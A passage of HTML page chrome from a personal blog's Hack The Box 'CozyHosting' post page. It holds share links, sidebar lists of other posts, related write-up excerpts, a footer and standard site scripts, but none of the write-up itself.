fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack%20the%20box%20-%20CozyHosting%20pwned!%20-%20rubenhortas@blog&u=https%3A%2F%2Frubenhortas.github.io%2Fposts%2Fhtb-cozyhosting%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Frubenhortas.github.io%2Fposts%2Fhtb-cozyhosting%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/neovim-python-ide/">Configuring Neovim as Python IDE</a><li><a href="/posts/neovim-rust-ide/">Configuring Neovim as Rust IDE</a><li><a href="/posts/neovim-c-standard-ide/">Configuring Neovim as Standard C IDE</a><li><a href="/posts/pycharm-neovim-ruff-consistency/">Unify Python Linting. Syncing Ruff between PyCharm and Neovim</a><li><a href="/posts/check-ntp-servers-windows/">How to check NTP servers from Windows</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/gnu-linux/">gnu/linux</a> <a class="post-tag" href="/tags/administration/">administration</a> <a class="post-tag" href="/tags/personal/">personal</a> <a class="post-tag" href="/tags/hardening/">hardening</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/programming/">programming</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/ssh/">ssh</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-nibbles/"><div class="card-body"> <em class="small" data-ts="1688342401" data-df="ll" > Jul 3, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the box - Nibbles</h3><div class="text-muted small"><p> Nibbles In this article we are going to assume the following IP addresses: Local machine (attacker, localhost): 10.0.0.1 Target machine (victim, Nibbles box): 10.0.0.2 As this is a ret...</p></div></div></a></div><div class="card"> <a href="/posts/htb-getting-started/"><div class="card-body"> <em class="small" data-ts="1688515201" data-df="ll" > Jul 5, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the box - Getting started</h3><div class="text-muted small"><p> Getting started In this article we are going to assume the folling ip addresses: Local machine (attacker, localhost): 10.0.0.1 Target machine (victim, Getting started box): 10.0.0.2 Th...</p></div></div></a></div><div class="card"> <a href="/posts/htb-twomillion/"><div class="card-body"> <em class="small" data-ts="1706918401" data-df="ll" > Feb 3, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the box - TwoMillion pwned!</h3><div class="text-muted small"><p> TwoMillion has been Pwned Enjoy! ;)</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-triangles/" class="btn btn-outline-primary" prompt="Older"><p>Hack The Box - Triangles pwned!</p></a> <a href="/posts/htb-codify/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the box - Codify pwned!</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/gnu-linux/">gnu/linux</a> <a class="post-tag" href="/tags/administration/">administration</a> <a class="post-tag" href="/tags/personal/">personal</a> <a class="post-tag" href="/tags/hardening/">hardening</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/programming/">programming</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/ssh/">ssh</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2026 <a href="https://github.com/rubenhortas">Rubén Hortas</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/unregister.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-NJBDP43045"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-NJBDP43045'); }); </script>
